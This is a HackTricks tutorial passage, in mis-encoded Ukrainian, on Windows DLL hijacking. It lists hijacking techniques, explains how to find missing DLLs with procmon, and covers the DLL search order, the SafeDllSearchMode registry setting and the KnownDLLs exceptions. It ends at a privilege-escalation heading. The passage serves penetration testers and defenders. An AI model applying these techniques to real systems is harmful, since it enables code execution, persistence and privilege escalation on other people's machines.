# Dll Hijacking

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**–ü—ñ–¥–∫–∞–∑–∫–∞ —â–æ–¥–æ –±–∞–≥—ñ–≤ —É –≤–∏–Ω–∞–≥–æ—Ä–æ–¥—ñ**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—è** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ–∞–ª—å–Ω—ñ–π **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –±–∞–≥—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ, —ñ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è DLL –≤–∫–ª—é—á–∞—î –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –¥–æ–≤—ñ—Ä–µ–Ω–æ—é –ø—Ä–æ–≥—Ä–∞–º–æ—é –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó DLL. –¶–µ–π —Ç–µ—Ä–º—ñ–Ω –æ—Ö–æ–ø–ª—é—î –∫—ñ–ª—å–∫–∞ —Ç–∞–∫—Ç–∏–∫, —Ç–∞–∫–∏—Ö —è–∫ **–ø—ñ–¥—Ä–æ–±–∫–∞, —ñ–Ω'—î–∫—Ü—ñ—è —Ç–∞ –±–æ–∫–æ–≤–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL**. –¶–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≥–æ–ª–æ–≤–Ω–∏–º —á–∏–Ω–æ–º –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É, –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è –ø–æ—Å—Ç—ñ–π–Ω–æ—Å—Ç—ñ —Ç–∞, –º–µ–Ω—à —á–∞—Å—Ç–æ, –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –∞–∫—Ü–µ–Ω—Ç –Ω–∞ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —Ç—É—Ç, –º–µ—Ç–æ–¥ –≤–∏–∫—Ä–∞–¥–µ–Ω–Ω—è –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è —Å—Ç—ñ–π–∫–∏–º –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ü—ñ–ª–µ–π.

### –ó–∞–≥–∞–ª—å–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏

–î–ª—è –≤–∏–∫—Ä–∞–¥–µ–Ω–Ω—è DLL –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –∫—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤, –∫–æ–∂–µ–Ω –∑ —è–∫–∏—Ö –º–∞—î —Å–≤–æ—é –µ—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL –ø—Ä–æ–≥—Ä–∞–º–∏:

1. **–ó–∞–º—ñ–Ω–∞ DLL**: –ó–∞–º—ñ–Ω–∞ —Å–ø—Ä–∞–≤–∂–Ω—å–æ—ó DLL –Ω–∞ —à–∫—ñ–¥–ª–∏–≤—É, –∑–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ü—ñ–¥—Ä–æ–±–∫—É DLL –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ—ó DLL.
2. **–í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è –ø–æ—Ä—è–¥–∫—É –ø–æ—à—É–∫—É DLL**: –†–æ–∑–º—ñ—â–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó DLL —É —à–ª—è—Ö—É –ø–æ—à—É–∫—É –ø–µ—Ä–µ–¥ –∑–∞–∫–æ–Ω–Ω–æ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —à–∞–±–ª–æ–Ω –ø–æ—à—É–∫—É –ø—Ä–æ–≥—Ä–∞–º–∏.
3. **–í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è —Ñ–∞–Ω—Ç–æ–º–Ω–æ—ó DLL**: –°—Ç–≤–æ—Ä–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó DLL –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–æ—é, –≤–≤–∞–∂–∞—é—á–∏, —â–æ —Ü–µ –Ω–µ–≤—ñ–¥–æ–º–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∞ DLL.
4. **–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è DLL**: –ó–º—ñ–Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –ø–æ—à—É–∫—É, —Ç–∞–∫–∏—Ö —è–∫ `%PATH%` –∞–±–æ —Ñ–∞–π–ª–∏ `.exe.manifest` / `.exe.local`, —â–æ–± —Å–ø—Ä—è–º—É–≤–∞—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º—É –Ω–∞ —à–∫—ñ–¥–ª–∏–≤—É DLL.
5. **–ó–∞–º—ñ–Ω–∞ DLL —É WinSxS**: –ó–∞–º—ñ–Ω–∞ –∑–∞–∫–æ–Ω–Ω–æ—ó DLL –Ω–∞ —à–∫—ñ–¥–ª–∏–≤–∏–π –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç —É –∫–∞—Ç–∞–ª–æ–∑—ñ WinSxS, –º–µ—Ç–æ–¥ —á–∞—Å—Ç–æ –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –±–æ–∫–æ–≤–∏–º –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º DLL.
6. **–í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è DLL –∑–∞ –≤—ñ–¥–Ω–æ—Å–Ω–∏–º —à–ª—è—Ö–æ–º**: –†–æ–∑–º—ñ—â–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó DLL —É –∫–∞—Ç–∞–ª–æ–∑—ñ, –∫–æ—Ç—Ä–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, —Ä–∞–∑–æ–º –∑ –∫–æ–ø—ñ–π–æ–≤–∞–Ω–æ—é –ø—Ä–æ–≥—Ä–∞–º–æ—é, –Ω–∞–≥–∞–¥—É—é—á–∏ —Ç–µ—Ö–Ω—ñ–∫–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö –ø—Ä–æ–∫—Å—ñ.

## –ü–æ—à—É–∫ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Ö DLL

–ù–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à–∏–π —Å–ø–æ—Å—ñ–± –∑–Ω–∞–π—Ç–∏ –≤—ñ–¥—Å—É—Ç–Ω—ñ DLL —É —Å–∏—Å—Ç–µ–º—ñ - –∑–∞–ø—É—Å—Ç–∏—Ç–∏ [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) –≤—ñ–¥ sysinternals, **–≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏** –Ω–∞—Å—Ç—É–ø–Ω—ñ **2 —Ñ—ñ–ª—å—Ç—Ä–∏**:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

—ñ –ø—Ä–æ—Å—Ç–æ –ø–æ–∫–∞–∑–∞—Ç–∏ **–ê–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏**:

![](<../../../.gitbook/assets/image (314).png>)

–Ø–∫—â–æ –≤–∏ —à—É–∫–∞—î—Ç–µ **–≤—ñ–¥—Å—É—Ç–Ω—ñ DLL –∑–∞–≥–∞–ª–æ–º**, –≤–∏ **–∑–∞–ª–∏—à–∞—î—Ç–µ** —Ü–µ –ø—Ä–∞—Ü—é—é—á–∏–º –ø—Ä–æ—Ç—è–≥–æ–º –¥–µ–∫—ñ–ª—å–∫–æ—Ö **—Å–µ–∫—É–Ω–¥**.\
–Ø–∫—â–æ –≤–∏ —à—É–∫–∞—î—Ç–µ **–≤—ñ–¥—Å—É—Ç–Ω—é DLL —É –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–º—É —Ñ–∞–π–ª—ñ**, –≤–∞–º —Å–ª—ñ–¥ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ **—ñ–Ω—à–∏–π —Ñ—ñ–ª—å—Ç—Ä, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ "–Ü–º'—è –ø—Ä–æ—Ü–µ—Å—É" "–º—ñ—Å—Ç–∏—Ç—å" "<—ñ–º'—è –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É>", –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ —ñ –∑—É–ø–∏–Ω–∏—Ç–∏ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –ø–æ–¥—ñ–π**.

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—ñ–¥—Å—É—Ç–Ω—ñ—Ö DLL

–î–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –Ω–∞–π–∫—Ä–∞—â–∏–π —à–∞–Ω—Å - –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–∑–∞–ø–∏—Å–∞—Ç–∏ DLL, —è–∫—É –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –ø—Ä–æ—Ü–µ—Å —Å–ø—Ä–æ–±—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** –≤ —è–∫–æ–º—É—Å—å **–º—ñ—Å—Ü—ñ, –¥–µ —ó—ó –±—É–¥–µ —à—É–∫–∞—Ç–∏**. –¢–æ–º—É –º–∏ –∑–º–æ–∂–µ–º–æ **–∑–∞–ø–∏—Å–∞—Ç–∏** DLL —É **–∫–∞—Ç–∞–ª–æ–∑—ñ**, –¥–µ **DLL —à—É–∫–∞—î—Ç—å—Å—è –ø–µ—Ä–µ–¥** –∫–∞—Ç–∞–ª–æ–≥–æ–º, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è **–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ DLL** (–¥–∏–≤–Ω–∏–π –≤–∏–ø–∞–¥–æ–∫), –∞–±–æ –º–∏ –∑–º–æ–∂–µ–º–æ **–∑–∞–ø–∏—Å–∞—Ç–∏ —É –∫–∞—Ç–∞–ª–æ–∑—ñ, –¥–µ –±—É–¥–µ —à—É–∫–∞—Ç–∏—Å—è DLL**, –∞ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ **DLL –Ω–µ —ñ—Å–Ω—É—î** —É –∂–æ–¥–Ω–æ–º—É –∫–∞—Ç–∞–ª–æ–∑—ñ.

### –ü–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É DLL

–£ [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **–º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏, —è–∫ —Å–∞–º–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è DLL**.

**Windows-–¥–æ–¥–∞—Ç–∫–∏** —à—É–∫–∞—é—Ç—å DLL, —Å–ª—ñ–¥—É—é—á–∏ –Ω–∞–±–æ—Ä—É **–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∏—Ö —à–ª—è—Ö—ñ–≤ –ø–æ—à—É–∫—É**, –¥–æ—Ç—Ä–∏–º—É—é—á–∏—Å—å –ø–µ–≤–Ω–æ—ó –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ. –ü—Ä–æ–±–ª–µ–º–∞ –≤–∏–∫—Ä–∞–¥–µ–Ω–Ω—è DLL –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ —à–∫—ñ–¥–ª–∏–≤–∞ DLL —Å—Ç—Ä–∞—Ç–µ–≥—ñ—á–Ω–æ —Ä–æ–∑–º—ñ—â—É—î—Ç—å—Å—è –≤ –æ–¥–Ω–æ–º—É –∑ —Ü–∏—Ö –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, —â–æ–± –≥–∞—Ä–∞–Ω—Ç—É–≤–∞—Ç–∏, —â–æ –≤–æ–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è –ø–µ—Ä–µ–¥ –∞–≤—Ç–µ–Ω—Ç–∏—á–Ω–æ—é DLL. –†—ñ—à–µ–Ω–Ω—è –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —Ü—å–æ–º—É - –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∞–±—Å–æ–ª—é—Ç–Ω—ñ —à–ª—è—Ö–∏ –ø—Ä–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—ñ –Ω–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ DLL.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **–ø–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É DLL –Ω–∞ 32-–±—ñ—Ç–Ω–∏—Ö** —Å–∏—Å—Ç–µ–º–∞—Ö –Ω–∏–∂—á–µ:

1. –ö–∞—Ç–∞–ª–æ–≥, –∑ —è–∫–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ –¥–æ–¥–∞—Ç–æ–∫.
2. –°–∏—Å—Ç–µ–º–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—é [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —à–ª—è—Ö –¥–æ —Ü—å–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É.(_C:\Windows\System32_)
3. 16-–±—ñ—Ç–Ω–∏–π —Å–∏—Å—Ç–µ–º–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥. –ù–µ–º–∞—î —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –æ—Ç—Ä–∏–º—É—î —à–ª—è—Ö –¥–æ —Ü—å–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É, –∞–ª–µ –≤—ñ–Ω —à—É–∫–∞—î—Ç—å—Å—è. (_C:\Windows\System_)
4. –ö–∞—Ç–∞–ª–æ–≥ Windows. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—é [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —à–ª—è—Ö –¥–æ —Ü—å–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É.
5. (_C:\Windows_)
6. –ü–æ—Ç–æ—á–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥.
7. –ö–∞—Ç–∞–ª–æ–≥–∏, —è–∫—ñ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤–∞–Ω—ñ –≤ –∑–º—ñ–Ω–Ω—ñ–π —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ PATH. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ –Ω–µ –≤–∫–ª—é—á–∞—î —à–ª—è—Ö, –≤–∫–∞–∑–∞–Ω–∏–π –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –¥–æ–¥–∞—Ç–∫–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–ª—é—á–∞ —Ä–µ—î—Å—Ç—Ä—É **App Paths**. –ö–ª—é—á **App Paths** –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø—Ä–∏ –æ–±—á–∏—Å–ª–µ–Ω–Ω—ñ —à–ª—è—Ö—É –ø–æ—à—É–∫—É DLL.

–¶–µ **—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π** –ø–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º **SafeDllSearchMode**. –ö–æ–ª–∏ –≤—ñ–Ω –≤–∏–º–∫–Ω–µ–Ω–∏–π, –ø–æ—Ç–æ—á–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –ø—ñ–¥–Ω—ñ–º–∞—î—Ç—å—Å—è –Ω–∞ –¥—Ä—É–≥–µ –º—ñ—Å—Ü–µ. –©–æ–± –≤–∏–º–∫–Ω—É—Ç–∏ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é, —Å—Ç–≤–æ—Ä—ñ—Ç—å –∑–Ω–∞—á–µ–Ω–Ω—è —Ä–µ—î—Å—Ç—Ä—É **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –π–æ–≥–æ –Ω–∞ 0 (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —É–≤—ñ–º–∫–Ω–µ–Ω–æ).

–Ø–∫—â–æ [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑ **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, –ø–æ—à—É–∫ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ –≤–∏–∫–æ–Ω–∞–≤—á–æ–≥–æ –º–æ–¥—É–ª—è, —è–∫–∏–π –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î **LoadLibraryEx**.

–ù–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è, —Å–ª—ñ–¥ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ **DLL –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞, –≤–∫–∞–∑–∞–≤—à–∏ –∞–±—Å–æ–ª—é—Ç–Ω–∏–π —à–ª—è—Ö –∑–∞–º—ñ—Å—Ç—å –ø—Ä–æ—Å—Ç–æ —ñ–º–µ–Ω—ñ**. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É DLL **–±—É–¥–µ —à—É–∫–∞—Ç–∏—Å—è –ª–∏—à–µ –≤ —Ü—å–æ–º—É —à–ª—è—Ö—É** (—è–∫—â–æ —É DLL —î –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ, –≤–æ–Ω–∏ –±—É–¥—É—Ç—å —à—É–∫–∞—Ç–∏—Å—è –∑–∞ —ñ–º–µ–Ω–µ–º, —â–æ —ó—Ö –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ).

–Ñ —ñ–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –∑–º—ñ–Ω–∏—Ç–∏ –ø–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É, –∞–ª–µ —è –Ω–µ –±—É–¥—É –ø–æ—è—Å–Ω—é–≤–∞—Ç–∏ —ó—Ö —Ç—É—Ç.

#### –í–∏–∫–ª—é—á–µ–Ω–Ω—è —É –ø–æ—Ä—è–¥–∫—É –ø–æ—à—É–∫—É DLL –∑ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó Windows

–î–µ—è–∫—ñ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è –∑—ñ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –ø–æ—Ä—è–¥–∫—É –ø–æ—à—É–∫—É DLL –≤—ñ–¥–∑–Ω–∞—á–µ–Ω—ñ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó Windows:

* –ö–æ–ª–∏ –∑—É—Å—Ç—Ä—ñ—á–∞—î—Ç—å—Å—è **DLL, —è–∫–∞ –º–∞—î —Ç—É —Å–∞–º—É –Ω–∞–∑–≤—É, —â–æ –π –æ–¥–Ω–∞ –∑ —É–∂–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö —É –ø–∞–º'—è—Ç—å**, —Å–∏—Å—Ç–µ–º–∞ –æ–±—Ö–æ–¥–∏—Ç—å –∑–≤–∏—á–∞–π–Ω–∏–π –ø–æ—à—É–∫. –ó–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –≤–æ–Ω–∞ –≤–∏–∫–æ–Ω—É—î –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ç–∞ –º–∞–Ω—ñ—Ñ–µ—Å—Ç –ø–µ—Ä–µ–¥ —Ç–∏–º, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ DLL, —è–∫–∞ –≤–∂–µ —î –≤ –ø–∞–º'—è—Ç—ñ. **–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Å–∏—Å—Ç–µ–º–∞ –Ω–µ –≤–∏–∫–æ–Ω—É—î –ø–æ—à—É–∫ DLL**.
* –£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ DLL –≤–∏–∑–Ω–∞–Ω–∞ —è–∫ **–≤—ñ–¥–æ–º–∞ DLL** –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ—ó –≤–µ—Ä—Å—ñ—ó Windows, —Å–∏—Å—Ç–µ–º–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ —Å–≤–æ—é –≤–µ—Ä—Å—ñ—é –≤—ñ–¥–æ–º–æ—ó DLL, —Ä–∞–∑–æ–º –∑ –±—É–¥—å-—è–∫–∏–º–∏ –∑–∞–ª–µ–∂–Ω–∏–º–∏ DLL, **–ø—Ä–æ–ø—É—Å–∫–∞—é—á–∏ –ø—Ä–æ—Ü–µ—Å –ø–æ—à—É–∫—É**. –ö–ª—é—á —Ä–µ—î—Å—Ç—Ä—É **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** –º—ñ—Å—Ç–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Ü–∏—Ö –≤—ñ–¥–æ–º–∏—Ö DLL.
* –Ø–∫—â–æ —É DLL —î **–∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ**, –ø–æ—à—É–∫ —Ü–∏—Ö –∑–∞–ª–µ–∂–Ω–∏—Ö DLL –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —Ç–∞–∫, –Ω—ñ–±–∏ –≤–æ–Ω–∏ –±—É–ª–∏ –≤–∫–∞–∑–∞–Ω—ñ –ª–∏—à–µ –∑–∞ —ó—Ö **—ñ–º–µ–Ω–∞–º–∏ –º–æ–¥—É–ª—ñ–≤**, –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —á–∏ –±—É–ª–æ –ø–æ—á–∞—Ç–∫–æ–≤—É DLL —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ –∑–∞ –ø–æ–≤–Ω–∏–º —à–ª—è—Ö–æ–º.

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤

**–í–∏–º–æ–≥–∏**:

